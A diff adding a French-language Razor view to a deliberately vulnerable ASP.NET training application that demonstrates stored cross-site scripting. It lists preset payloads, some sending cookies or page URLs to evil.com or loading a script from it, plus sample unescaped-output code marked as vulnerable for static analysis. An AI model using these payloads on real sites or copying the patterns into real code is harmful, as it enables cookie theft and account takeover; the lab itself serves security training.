@@ -1,0 +1,335 @@
+﻿@using InsecureAppWebNet8.ViewModels
+@using InsecureAppWebNet8.Controllers
+@model VulnerabilityViewModel<XssStoredResult>
+
+@{
+    ViewData["Title"] = "XSS Stored (Persistent) Vulnerabilities";
+}
+
+<div class="container mt-4">
+    <!-- Avertissement de sécurité -->
+    <div class="alert alert-danger" role="alert">
+        <i class="fas fa-exclamation-triangle"></i>
+        <strong>DANGER CRITIQUE :</strong> Ce module contient de vraies vulnérabilités XSS Stored (Persistent).
+        Les payloads sont stockés en "base de données" et exécutés à chaque chargement !
+    </div>
+
+    <h2>XSS Stored (Persistent) Vulnerabilities</h2>
+    <p class="text-muted">Injection de scripts stockés de manière permanente et exécutés à chaque affichage</p>
+
+    <!-- État du système -->
+    <div class="alert alert-danger">
+        <i class="fas fa-database"></i> <strong>Stockage vulnérable :</strong>
+        Commentaires | Profils | Posts Forum | Livre d'or | Avis | Fichiers | Interface Admin
+    </div>
+
+    <!-- Formulaire principal -->
+    <form asp-controller="XssStored" asp-action="Index" method="post" class="mb-4">
+        <div class="row">
+            <div class="col-md-6">
+                <div class="form-group mb-3">
+                    <label for="attackType" class="form-label">Type de XSS Stored</label>
+                    <select id="attackType" name="attackType" class="form-control">
+                        <option value="">-- Sélectionnez un type --</option>
+                        @foreach (var attackInfo in Model.AttackInfos)
+                        {
+                            var selected = Model.AttackType == attackInfo.Key ? "selected" : "";
+                            <option value="@attackInfo.Key" selected="@selected">
+                                @attackInfo.Key.ToUpper() - @attackInfo.Value.RiskLevel
+                            </option>
+                        }
+                    </select>
+                </div>
+            </div>
+
+            <div class="col-md-6">
+                <div class="form-group mb-3">
+                    <label for="payload" class="form-label">Payload XSS Persistent</label>
+                    <input type="text" id="payload" name="payload" class="form-control font-monospace"
+                           value="@Model.Payload" placeholder="<script>alert('Stored-XSS')</script>">
+                </div>
+                <button type="submit" class="btn btn-danger">
+                    <i class="fas fa-database"></i> Stocker le payload XSS
+                </button>
+            </div>
+        </div>
+    </form>
+
+    <!-- Payloads XSS Stored prédéfinis -->
+    <div class="row mb-4">
+        <div class="col-12">
+            <div class="card border-danger">
+                <div class="card-header bg-danger text-white">
+                    <h6><i class="fas fa-bomb"></i> Payloads XSS Stored (Persistent)</h6>
+                </div>
+                <div class="card-body" style="background-color: white !important;">
+                    <div class="row">
+                        <div class="col-md-3">
+                            <h6 style="color: #212529 !important;">Commentaires :</h6>
+                            <button class="btn btn-sm btn-outline-danger mb-2 w-100" onclick="setPayload('<script>alert(&#34;Stored-Comment&#34;)</script>')">Script Comment</button>
+                            <button class="btn btn-sm btn-outline-danger mb-2 w-100" onclick="setPayload('<img src=x onerror=alert(&#34;Comment-XSS&#34;)>')">IMG Comment</button>
+                            <button class="btn btn-sm btn-outline-danger mb-2 w-100" onclick="setPayload('<svg onload=alert(&#34;SVG-Comment&#34;)>')">SVG Comment</button>
+                        </div>
+                        <div class="col-md-3">
+                            <h6 style="color: #212529 !important;">Profils :</h6>
+                            <button class="btn btn-sm btn-outline-warning mb-2 w-100" onclick="setPayload('<iframe src=&#34;javascript:alert(\\&#34;Profile-XSS\\&#34;)&#34;></iframe>')">Iframe Bio</button>
+                            <button class="btn btn-sm btn-outline-warning mb-2 w-100" onclick="setPayload('javascript:alert(&#34;Website-XSS&#34;)')">JS Website</button>
+                            <button class="btn btn-sm btn-outline-warning mb-2 w-100" onclick="setPayload('<details open ontoggle=alert(&#34;Bio-XSS&#34;)>')">Details Bio</button>
+                        </div>
+                        <div class="col-md-3">
+                            <h6 style="color: #212529 !important;">Admin Target :</h6>
+                            <button class="btn btn-sm btn-outline-dark mb-2 w-100" onclick="setPayload('<script>fetch(&#34;/admin/users&#34;).then(r=>alert(&#34;Admin-Pwned&#34;))</script>')">Admin Steal</button>
+                            <button class="btn btn-sm btn-outline-dark mb-2 w-100" onclick="setPayload('<img src=x onerror=&#34;document.body.appendChild(document.createElement(\\&#34;script\\&#34;)).src=\\&#34;//evil.com/xss.js\\&#34;&#34;>')">External JS</button>
+                            <button class="btn btn-sm btn-outline-dark mb-2 w-100" onclick="setPayload('<script>setInterval(()=>fetch(&#34;//evil.com/beacon?url=&#34;+location.href),5000)</script>')">Beacon</button>
+                        </div>
+                        <div class="col-md-3">
+                            <h6 style="color: #212529 !important;">Persistant :</h6>
+                            <button class="btn btn-sm btn-outline-info mb-2 w-100" onclick="setPayload('<script>localStorage.setItem(&#34;xss&#34;,&#34;alert(\\&#34;Persistent\\&#34;)&#34;);eval(localStorage.getItem(&#34;xss&#34;))</script>')">LocalStorage</button>
+                            <button class="btn btn-sm btn-outline-info mb-2 w-100" onclick="setPayload('<img src=&#34;x&#34; onerror=&#34;this.onerror=null;this.src=\\&#34;//evil.com/steal?c=\\&#34;+document.cookie&#34;>')">Cookie Steal</button>
+                            <button class="btn btn-sm btn-outline-info mb-2 w-100" onclick="setPayload('<marquee onstart=alert(&#34;Marquee-XSS&#34;)>Persistent</marquee>')">Marquee</button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Zones de stockage XSS -->
+    <div class="alert alert-warning">
+        <h5><i class="fas fa-database"></i> Zones de Stockage XSS Vulnérables</h5>
+        <div class="row">
+            <div class="col-md-6 mb-3">
+                <div class="card border-danger">
+                    <div class="card-header bg-danger text-white">Commentaires Blog</div>
+                    <div class="card-body" style="background-color: white !important;">
+                        <input type="text" id="commentAuthor" class="form-control mb-2" placeholder="Nom d'auteur">
+                        <textarea id="commentContent" class="form-control mb-2" rows="3" 
+                                  placeholder="<script>alert('Stored-Comment')</script>"></textarea>
+                        <button class="btn btn-danger btn-sm" onclick="addStoredComment()">Stocker Commentaire</button>
+                        <div id="commentResult" class="mt-2 p-2 border rounded stored-content"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 mb-3">
+                <div class="card border-warning">
+                    <div class="card-header bg-warning text-dark">Profil Utilisateur</div>
+                    <div class="card-body" style="background-color: white !important;">
+                        <input type="text" id="profileUsername" class="form-control mb-2" placeholder="Username">
+                        <input type="text" id="profileBio" class="form-control mb-2" 
+                               placeholder="<img src=x onerror=alert('Profile-XSS')>">
+                        <input type="text" id="profileWebsite" class="form-control mb-2" 
+                               placeholder="javascript:alert('Website-XSS')">
+                        <button class="btn btn-warning btn-sm" onclick="updateStoredProfile()">Stocker Profil</button>
+                        <div id="profileResult" class="mt-2 p-2 border rounded stored-content"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <div class="row">
+            <div class="col-md-6 mb-3">
+                <div class="card border-info">
+                    <div class="card-header bg-info text-white">Post Forum</div>
+                    <div class="card-body" style="background-color: white !important;">
+                        <input type="text" id="forumTitle" class="form-control mb-2" 
+                               placeholder="<svg onload=alert('Forum-Title')>">
+                        <textarea id="forumContent" class="form-control mb-2" rows="3" 
+                                  placeholder="<iframe src='javascript:alert(1)'></iframe>"></textarea>
+                        <button class="btn btn-info btn-sm" onclick="createStoredPost()">Stocker Post</button>
+                        <div id="forumResult" class="mt-2 p-2 border rounded stored-content"></div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-md-6 mb-3">
+                <div class="card border-success">
+                    <div class="card-header bg-success text-white">Livre d'Or</div>
+                    <div class="card-body" style="background-color: white !important;">
+                        <input type="text" id="guestName" class="form-control mb-2" placeholder="Nom visiteur">
+                        <textarea id="guestMessage" class="form-control mb-2" rows="2" 
+                                  placeholder="<details open ontoggle=alert('Guest-XSS')>"></textarea>
+                        <button class="btn btn-success btn-sm" onclick="addGuestEntry()">Stocker Message</button>
+                        <div id="guestResult" class="mt-2 p-2 border rounded stored-content"></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Résultats des tests -->
+    @if (Model.Results?.Any() == true)
+    {
+        <div class="alert alert-danger">
+            <h5><i class="fas fa-skull-crossbones"></i> XSS Stored Détectés - CRITIQUE</h5>
+            @foreach (var result in Model.Results)
+            {
+                <div class="card mb-3 border-danger">
+                    <div class="card-header bg-danger text-white">
+                        <strong>@result.AttackType.ToUpper()</strong> - VULNÉRABILITÉ CRITIQUE
+                    </div>
+                    <div class="card-body" style="background-color: white !important;">
+                        <div class="row">
+                            <div class="col-md-6">
+                                <p style="color: #212529 !important;"><strong>Message :</strong> @result.Message</p>
+                                <p style="color: #212529 !important;"><strong>Localisation :</strong> <code>@result.StoredLocation</code></p>
+                                <p style="color: #212529 !important;"><strong>Niveau d'impact :</strong> 
+                                    <span class="badge bg-danger">@result.ImpactLevel</span>
+                                </p>
+                            </div>
+                            <div class="col-md-6">
+                                <p style="color: #212529 !important;"><strong>Utilisateurs affectés :</strong> @result.AffectedUsers</p>
+                                <p style="color: #212529 !important;"><strong>Persistance :</strong> @result.Persistence</p>
+                                <div class="alert alert-danger small">
+                                    <i class="fas fa-exclamation-triangle"></i>
+                                    Le payload est maintenant stocké de manière permanente !
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            }
+        </div>
+    }
+
+    <!-- Description de l'attaque -->
+    @if (!string.IsNullOrEmpty(Model.AttackType) && Model.AttackInfos.ContainsKey(Model.AttackType))
+    {
+        var attackInfo = Model.AttackInfos[Model.AttackType];
+
+        <div class="alert-danger alert">
+            <div class="d-flex align-items-start">
+                <div class="me-3">
+                    <i class="fas fa-skull-crossbones text-danger fa-3x"></i>
+                </div>
+                <div class="flex-grow-1">
+                    <h5>@Model.AttackType.ToUpper() - @attackInfo.RiskLevel Risk</h5>
+                    <p class="mb-2">@attackInfo.Description</p>
+                    <div class="d-flex gap-2">
+                        <a href="@attackInfo.LearnMoreUrl" target="_blank" class="btn btn-sm btn-outline-light">
+                            <i class="fas fa-external-link-alt"></i> En savoir plus
+                        </a>
+                        <span class="badge bg-dark">
+                            Persistance : PERMANENT
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    }
+
+    <!-- Contenu stocké actuel (VULNÉRABLE) -->
+    <div class="row mt-4">
+        <div class="col-md-6">
+            <div class="card border-danger">
+                <div class="card-header bg-danger text-white">
+                    <h6><i class="fas fa-comments"></i> Commentaires Stockés (VULNÉRABLES)</h6>
+                </div>
+                <div class="card-body" style="background-color: white !important;" id="storedComments">
+                    <!-- Les commentaires stockés seront affichés ici -->
+                </div>
+            </div>
+        </div>
+        <div class="col-md-6">
+            <div class="card border-warning">
+                <div class="card-header bg-warning text-dark">
+                    <h6><i class="fas fa-users"></i> Profils Utilisateurs (VULNÉRABLES)</h6>
+                </div>
+                <div class="card-body" style="background-color: white !important;" id="storedProfiles">
+                    <!-- Les profils stockés seront affichés ici -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Patterns SAST pour XSS Stored -->
+    <div class="card border-secondary mt-4">
+        <div class="card-header bg-dark text-white">
+            <h6><i class="fas fa-search"></i> Patterns XSS Stored détectables par SAST</h6>
+        </div>
+        <div class="card-body" style="background-color: white !important;">
+            <div class="row">
+                <div class="col-md-6">
+                    <h6 style="color: #212529 !important;">Stockage sans sanitisation :</h6>
+                    <pre style="background-color: #f8f9fa !important; color: #212529 !important; border: 1px solid #dee2e6 !important;"><code style="color: #212529 !important;">// VULNÉRABLE
+comment.Content = userInput; // Direct storage
+profile.Bio = request.Bio; // No validation
+
+// VULNÉRABLE
+_comments.Add(new Comment { 
+    Content = content // Raw HTML stored
+});</code></pre>
+
+                    <h6 style="color: #212529 !important;">Affichage sans échappement :</h6>
+                    <pre style="background-color: #f8f9fa !important; color: #212529 !important; border: 1px solid #dee2e6 !important;"><code style="color: #212529 !important;">// VULNÉRABLE
+Html.Raw(comment.Content)
+{comment.Content} // Direct output
+
+// VULNÉRABLE
+html += $"&lt;div&gt;{userContent}&lt;/div&gt;";</code></pre>
+                </div>
+                <div class="col-md-6">
+                    <h6 style="color: #212529 !important;">HTML généré vulnérable :</h6>
+                    <pre style="background-color: #f8f9fa !important; color: #212529 !important; border: 1px solid #dee2e6 !important;"><code style="color: #212529 !important;">// VULNÉRABLE
+GenerateCommentHtml(comment) {
+    return $"&lt;div&gt;{comment.Content}&lt;/div&gt;";
+}
+
+// VULNÉRABLE
+innerHTML = userGeneratedContent;</code></pre>
+
+                    <h6 style="color: #212529 !important;">JSON non échappé :</h6>
+                    <pre style="background-color: #f8f9fa !important; color: #212529 !important; border: 1px solid #dee2e6 !important;"><code style="color: #212529 !important;">// VULNÉRABLE
+JsonSerializer.Serialize(comments) // Raw data
+ViewBag.CommentsJson = rawData;
+
+// VULNÉRABLE
+window.data = Html.Raw(jsonData);</code></pre>
+                </div>
+            </div>
+
+            <div class="mt-3">
+                <strong style="color: #212529 !important;">Outils de détection XSS Stored :</strong>
+                <span class="badge bg-danger">Snyk</span>
+                <span class="badge bg-warning text-dark">SonarQube</span>
+                <span class="badge bg-info">Semgrep</span>
+                <span class="badge bg-success">ESLint Security</span>
+                <span class="badge bg-secondary">Burp Suite</span>
+                <span class="badge bg-primary">CodeQL</span>
+                <span class="badge bg-dark text-light">Checkmarx</span>
+                <span class="badge bg-light text-dark">Veracode</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- Zone d'avertissement final -->
+    <div class="alert alert-danger mt-4">
+        <div class="row">
+            <div class="col-md-8">
+                <h6><i class="fas fa-exclamation-triangle"></i> Impact des XSS Stored</h6>
+                <ul class="mb-0" style="color: #721c24 !important;">
+                    <li>Exécution automatique à chaque chargement de page</li>
+                    <li>Affecte TOUS les utilisateurs qui voient le contenu</li>
+                    <li>Persistance jusqu'à nettoyage manuel de la base</li>
+                    <li>Peut cibler spécifiquement les administrateurs</li>
+                    <li>Vol de cookies, tokens, données sensibles</li>
+                    <li>Redirection vers sites malveillants</li>
+                </ul>
+            </div>
+            <div class="col-md-4 text-center">
+                <i class="fas fa-skull-crossbones" style="font-size: 4rem; color: #dc3545;"></i>
+                <div class="mt-2">
+                    <span class="badge bg-danger fs-6">CRITIQUE</span>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+@section Styles {
+    <link rel="stylesheet" href="~/css/xss-stored.css" asp-append-version="true" />
+}
+
+@section Scripts {
+    <!-- Scripts externes -->
+    <script src="~/js/vulnerability-common.js"></script>
+    <script src="~/js/xss-stored.js"></script>
+}
